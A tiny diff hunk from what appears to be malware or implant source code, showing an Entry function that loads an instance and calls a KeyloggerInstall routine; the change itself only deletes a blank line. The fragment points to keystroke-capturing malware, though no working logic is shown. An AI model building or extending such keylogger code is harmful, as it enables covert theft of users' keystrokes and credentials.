@@ -385,7 +385,6 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
     ULONG Length    = 0;
 
     LoadAdds( &Instance );
-
     
     Result = KeyloggerInstall();
 
